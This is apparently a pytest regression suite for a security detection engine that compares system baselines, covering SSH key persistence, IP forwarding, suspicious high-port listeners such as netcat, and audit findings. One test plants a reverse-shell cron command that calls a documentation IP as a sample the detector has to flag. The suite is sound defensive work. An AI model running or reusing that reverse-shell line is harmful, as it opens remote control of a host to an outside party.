"""Regression tests for detection-correctness defects found by the engineering audit.

Each section reproduces one defect with the exact record shapes the real collectors emit, plus
the negative cases that must stay quiet. Synthetic data only.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest
from baseline_builders import finding, rec
from jsonschema import Draft202012Validator
from test_detection import NOW, SCHEMA, _diff, one, reports, rules_for, run

from shared.reporting.accepted import load as load_allowlist
from shared.reporting.baseline import compare
from shared.reporting.detection import RULES, DiffInputError, detect, exit_code_for
from shared.reporting.inventory import Options, build_snapshot

# ------------------------------------------------- P0-2: SSH keys in the collector's key shape


def authkey(owner: str, fp: str = "SHA256:aaaa", **extra: str) -> dict[str, Any]:
    """An SSH authorized-key record exactly as ``audit-users.sh`` emits it."""
    return rec(
        "persistence",
        f"persist:ssh-authkey:{owner}:{fp}",
        {
            "owner": owner,
            "type": "ssh-ed25519",
            "options": "",
            "file": f"/home/{owner}/.ssh/ak",
            **extra,
        },
        scope="ssh-authkeys",
        evidence=[("file", f"/home/{owner}/.ssh/ak")],
    )


def test_new_root_key_in_collector_shape_is_critical_per_001_not_generic_per_002() -> None:
    doc = run([], [authkey("root")])
    det = one(doc, "persist:ssh-authkey:root:SHA256:aaaa")
    assert det["severity"] == "critical"
    assert rules_for(doc, det["subject"]["key"]) == {"BO-PER-001"}


def test_new_non_root_key_is_high() -> None:
    doc = run([], [authkey("alice")])
    det = one(doc, "persist:ssh-authkey:alice:SHA256:aaaa")
    assert det["severity"] == "high"
    assert rules_for(doc, det["subject"]["key"]) == {"BO-PER-001"}


def test_owner_falls_back_to_the_key_segment_when_the_attribute_is_missing() -> None:
    bare = rec("persistence", "persist:ssh-authkey:root:SHA256:zz", {"type": "ssh-rsa"})
    assert one(run([], [bare]), "persist:ssh-authkey:root:SHA256:zz")["severity"] == "critical"


def test_key_already_in_the_baseline_is_silent() -> None:
    assert run([authkey("root")], [authkey("root")])["detections"] == []


def test_removed_key_is_silent() -> None:
    assert run([authkey("root")], [])["detections"] == []


def test_changed_key_record_is_still_reported_by_per_002() -> None:
    """Options (``from=``, ``command=``) or the file of an existing key changing must not vanish."""
    doc = run([authkey("alice", options="from=10.0.0.1")], [authkey("alice")])
    key = "persist:ssh-authkey:alice:SHA256:aaaa"
    assert rules_for(doc, key) == {"BO-PER-002"}
    assert one(doc, key)["severity"] == "high"


def test_legacy_synthetic_key_shape_still_works() -> None:
    legacy = rec(
        "persistence",
        "persist:ssh_key:root:SHA256:k1",
        {"user": "root", "type": "ssh-ed25519"},
        scope="ssh_keys",
    )
    assert one(run([], [legacy]), "persist:ssh_key:root:SHA256:k1")["severity"] == "critical"


# ------------------------- P0-4: Windows config:ip_forward carries `enabled`, not `value`


def fwd(enabled: bool) -> dict[str, Any]:
    """The Windows collector's record (Get-NetworkAudit.ps1): a boolean `enabled`."""
    return rec("config", "config:ip_forward", {"enabled": enabled}, scope="network")


def test_windows_ip_forwarding_turned_on_is_detected() -> None:
    doc = run([fwd(False)], [fwd(True)])
    det = one(doc, "config:ip_forward")
    assert (det["severity"], det["basis"]) == ("medium", "observed")
    assert rules_for(doc, "config:ip_forward") == {"BO-CFG-002"}


def test_windows_ip_forwarding_turned_off_or_unchanged_is_quiet() -> None:
    assert run([fwd(True)], [fwd(False)])["detections"] == []
    assert run([fwd(True)], [fwd(True)])["detections"] == []
    assert run([fwd(False)], [fwd(False)])["detections"] == []


def test_linux_sysctl_forwarding_rule_is_unchanged() -> None:
    def sysctl(v: str) -> dict[str, Any]:
        return rec("config", "config:sysctl:net.ipv4.ip_forward", {"value": v}, scope="sysctl")

    assert rules_for(run([sysctl("0")], [sysctl("1")]), "config:sysctl:net.ipv4.ip_forward") == {
        "BO-CFG-002"
    }
    assert run([sysctl("1")], [sysctl("0")])["detections"] == []


# ----------------------------------- P0-1: a new process on a high-port listener is not churn


def lport(proc: str, port: int, bind: str = "0.0.0.0", proto: str = "tcp") -> dict[str, Any]:
    """A listener exactly as the collectors emit it (the port is still in the key)."""
    return rec(
        "listeners",
        f"listener:{proto}/{bind}/{port}",
        {"proto": proto, "bind": bind, "port": str(port), "process": proc},
        volatile={"pid": "999"},
    )


BUCKET = "listener:tcp/0.0.0.0/ephemeral"
BASE_HIGH = [lport("sshd", 22), lport("metrics-agent", 40111)]


def test_netcat_on_a_high_port_is_detected_when_the_bucket_already_exists() -> None:
    """Reproduced defect: this returned zero detections, exit 0, coverage complete."""
    doc = run(BASE_HIGH, [*BASE_HIGH, lport("nc", 44444)])
    det = one(doc, BUCKET)
    assert (det["severity"], det["basis"]) == ("high", "heuristic")
    assert rules_for(doc, BUCKET) == {"BO-NET-002", "BO-NET-003"}
    assert any("44444" in r["observation"] for r in det["reasons"] if r["rule"] == "BO-NET-003")


def test_other_new_process_on_a_high_port_is_medium_not_a_backdoor_verdict() -> None:
    doc = run(BASE_HIGH, [*BASE_HIGH, lport("python3", 44444)])
    det = one(doc, BUCKET)
    assert (det["severity"], det["basis"]) == ("medium", "observed")
    assert rules_for(doc, BUCKET) == {"BO-NET-003"}


def test_new_process_on_loopback_high_port_is_low() -> None:
    base = [lport("sshd", 22), lport("ide", 40000, "127.0.0.1")]
    doc = run(base, [*base, lport("debugger", 40001, "127.0.0.1")])
    assert one(doc, "listener:tcp/127.0.0.1/ephemeral")["severity"] == "low"


def test_netcat_on_loopback_high_port_is_medium() -> None:
    base = [lport("sshd", 22), lport("ide", 40000, "127.0.0.1")]
    doc = run(base, [*base, lport("ncat", 40001, "127.0.0.1")])
    assert one(doc, "listener:tcp/127.0.0.1/ephemeral")["severity"] == "medium"


def test_first_high_port_listener_is_still_reported_as_added() -> None:
    doc = run([lport("sshd", 22)], [lport("sshd", 22), lport("nc", 44444)])
    assert rules_for(doc, BUCKET) == {"BO-NET-001", "BO-NET-002"}


def test_high_port_churn_stays_quiet() -> None:
    """Same name on another port, an extra socket of the same name, or a name leaving."""
    assert run(BASE_HIGH, [lport("sshd", 22), lport("metrics-agent", 51234)])["detections"] == []
    assert run(BASE_HIGH, [*BASE_HIGH, lport("metrics-agent", 51234)])["detections"] == [], (
        "a second socket of an already-known name is indistinguishable from port churn"
    )
    assert run(BASE_HIGH, [lport("sshd", 22)])["detections"] == []  # removed: not an alert
    both = [*BASE_HIGH, lport("nc", 44444)]
    assert run(both, BASE_HIGH)["detections"] == []  # remediation: nc left the bucket


def test_known_limit_same_name_on_a_new_high_port_needs_fixed_ports() -> None:
    """Documented limit (baseline-diff.md): the bucket compares names only. `fixed_ports` is the
    supported way to make a stable high-port service exact, and then a new port is detected."""
    cur = [*BASE_HIGH, lport("metrics-agent", 44444)]
    assert run(BASE_HIGH, cur)["detections"] == []

    opts = Options(fixed_ports=frozenset({40111, 44444}))
    base_r, cur_r = reports(BASE_HIGH, cur)
    snap = build_snapshot
    diff = compare(snap(base_r, opts), snap(cur_r, opts), opts, NOW)
    det = detect(diff, NOW)
    assert [d["subject"]["key"] for d in det["detections"]] == ["listener:tcp/0.0.0.0/44444"]


def test_low_ports_are_unaffected_by_the_bucket_logic() -> None:
    doc = run([lport("sshd", 22)], [lport("sshd", 22), lport("nc", 4444)])
    assert rules_for(doc, "listener:tcp/0.0.0.0/4444") == {"BO-NET-001", "BO-NET-002"}
    swapped = run([lport("sshd", 22)], [lport("python3", 22)])
    assert one(swapped, "listener:tcp/0.0.0.0/22")["severity"] == "high"  # BO-NET-003, well known


# --------------------- P0-3: new or escalated audit findings reach the rule layer (BO-FND-001)


def fdet(
    base_findings: list[dict[str, Any]],
    cur_findings: list[dict[str, Any]],
    base_recs: list[dict[str, Any]] | None = None,
    cur_recs: list[dict[str, Any]] | None = None,
    allow: Any = None,
) -> dict[str, Any]:
    """Detections for two reports that differ in their findings (and optionally in records)."""
    base, cur = reports(base_recs or [], cur_recs or [])
    base["findings"], cur["findings"] = base_findings, cur_findings
    doc = detect(_diff(base, cur), NOW, allow=allow)
    Draft202012Validator(SCHEMA).validate(doc)
    return doc


FINDING_KEY = "finding:PRC-DELETED-001"


def test_new_high_finding_with_no_inventory_change_is_detected() -> None:
    """Reproduced defect: the diff reported the finding (exit 4) but `detect` said exit 0."""
    doc = fdet([], [finding("PRC-DELETED-001", "high")])
    det = one(doc, FINDING_KEY)
    assert (det["severity"], det["basis"]) == ("high", "heuristic")
    assert det["subject"] == {
        "domain": "findings",
        "scope": "",
        "key": FINDING_KEY,
        "change": "added",
    }
    assert rules_for(doc, FINDING_KEY) == {"BO-FND-001"}
    assert det["related_findings"] == ["PRC-DELETED-001"]
    assert det["unknown"], "must say what the diff does not carry"
    assert exit_code_for(doc) == 4


def test_new_critical_finding_keeps_its_severity() -> None:
    assert one(fdet([], [finding("X-1", "critical")]), "finding:X-1")["severity"] == "critical"


@pytest.mark.parametrize("severity", ["info", "low", "medium"])
def test_new_findings_below_high_are_context_not_detections(severity: str) -> None:
    doc = fdet([], [finding("X-1", severity)])
    assert doc["detections"] == [] and exit_code_for(doc) == 0


def test_unchanged_finding_is_silent() -> None:
    f = finding("X-1", "high", evidence=[("file", "/etc/a")])
    assert fdet([f], [f])["detections"] == []


def test_finding_that_gained_evidence_is_detected() -> None:
    before = finding("PER-CRON-002", "high", evidence=[("file", "/etc/cron.d/old")])
    after = finding(
        "PER-CRON-002", "high", evidence=[("file", "/etc/cron.d/old"), ("file", "/etc/cron.d/new")]
    )
    det = one(fdet([before], [after]), "finding:PER-CRON-002")
    assert det["subject"]["change"] == "modified"
    assert det["evidence"] == [{"type": "audit-evidence", "ref": "/etc/cron.d/new"}]


def test_finding_that_escalated_is_detected() -> None:
    doc = fdet([finding("X-1", "medium")], [finding("X-1", "high")])
    det = one(doc, "finding:X-1")
    assert det["severity"] == "high"
    assert det["attributes"] == [{"name": "severity", "before": "medium", "after": "high"}]


def test_finding_that_improved_or_lost_evidence_is_silent() -> None:
    assert fdet([finding("X-1", "high")], [finding("X-1", "medium")])["detections"] == []
    two = finding("X-2", "high", evidence=[("file", "/a"), ("file", "/b")])
    one_ev = finding("X-2", "high", evidence=[("file", "/a")])
    assert fdet([two], [one_ev])["detections"] == []  # evidence removed: remediation
    assert fdet([finding("X-3", "high")], [])["detections"] == []  # resolved


def test_finding_already_covered_by_an_equally_severe_detection_is_not_repeated() -> None:
    ev = [("file", "/etc/cron.d/x")]
    job = rec(
        "scheduled_tasks",
        "cron:/etc/cron.d/x#1",
        {"command": "/tmp/x.sh", "schedule": "* * * * *", "user": "root"},
        scope="cron",
        evidence=ev,
    )
    doc = fdet([], [finding("PER-CRON-002", "high", evidence=ev)], [], [job])
    assert [d["subject"]["key"] for d in doc["detections"]] == ["cron:/etc/cron.d/x#1"]
    assert doc["detections"][0]["severity"] == "high"  # BO-EXE-001 already rates it high


def test_finding_more_severe_than_its_covering_detection_is_reported_and_linked() -> None:
    """A job whose text matches no known pattern is only medium, while the audit says high."""
    ev = [("file", "/etc/cron.d/x")]
    job = rec(
        "scheduled_tasks",
        "cron:/etc/cron.d/x#1",
        {"command": "/usr/local/bin/updater --quiet", "user": "root"},
        scope="cron",
        evidence=ev,
    )
    doc = fdet([], [finding("PER-CRON-002", "high", evidence=ev)], [], [job])
    cron_det = one(doc, "cron:/etc/cron.d/x#1")
    fnd = one(doc, "finding:PER-CRON-002")
    assert (cron_det["severity"], fnd["severity"]) == ("medium", "high")
    assert [c["id"] for c in cron_det["correlated"]] == [fnd["id"]]
    assert [c["id"] for c in fnd["correlated"]] == [cron_det["id"]]
    assert doc["summary"]["total"] == 2


def test_reverse_shell_job_is_high_on_its_own_and_absorbs_the_equal_finding() -> None:
    """With command-content analysis (BO-EXE-002) the job detection already matches the audit."""
    ev = [("file", "/etc/cron.d/x")]
    job = rec(
        "scheduled_tasks",
        "cron:/etc/cron.d/x#1",
        {"command": "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1", "user": "root"},
        scope="cron",
        evidence=ev,
    )
    doc = fdet([], [finding("PER-CRON-002", "high", evidence=ev)], [], [job])
    assert [d["subject"]["key"] for d in doc["detections"]] == ["cron:/etc/cron.d/x#1"]
    assert one(doc, "cron:/etc/cron.d/x#1")["severity"] == "high"


def test_malformed_finding_entry_is_a_rule_error_not_a_crash_or_a_clean_result() -> None:
    base, cur = reports([], [])
    diff = _diff(base, cur)
    diff["findings"]["new"] = [{"id": "X-1", "severity": "bogus"}, {"severity": "high"}, "text"]
    doc = detect(diff, NOW)
    assert doc["detections"] == []
    assert [e["rule"] for e in doc["coverage"]["rule_errors"]] == ["BO-FND-001"] * 3
    assert not doc["coverage"]["complete"] and exit_code_for(doc) == 6


def test_findings_section_of_the_wrong_shape_is_rejected() -> None:
    base, cur = reports([], [])
    diff = _diff(base, cur)
    diff["findings"]["new"] = "not a list"
    with pytest.raises(DiffInputError):
        detect(diff, NOW)


def test_finding_detection_can_be_accepted_with_an_exact_entry(tmp_path: Path) -> None:
    entry = {
        "id": "AC-1",
        "rules": ["BO-FND-001"],
        "domain": "findings",
        "key": FINDING_KEY,
        "max_severity": "high",
        "reason": "reviewed, known maintenance process",
        "approved_by": "analyst",
        "approved_at": "2026-03-01T00:00:00Z",
        "expires": "2026-04-01T00:00:00Z",
    }
    path = tmp_path / "accepted.json"
    path.write_text(
        json.dumps({"kind": "accepted-changes", "schema_version": "0.1.0", "entries": [entry]}),
        encoding="utf-8",
    )
    allow = load_allowlist(str(path), frozenset(r.rule_id for r in RULES))
    doc = fdet([], [finding("PRC-DELETED-001", "high")], allow=allow)
    assert doc["detections"] == [] and doc["summary"]["accepted"] == 1
    assert exit_code_for(doc) == 0
    crit = fdet([], [finding("PRC-DELETED-001", "critical")], allow=allow)
    assert crit["summary"]["total"] == 1, "a critical detection can never be accepted"
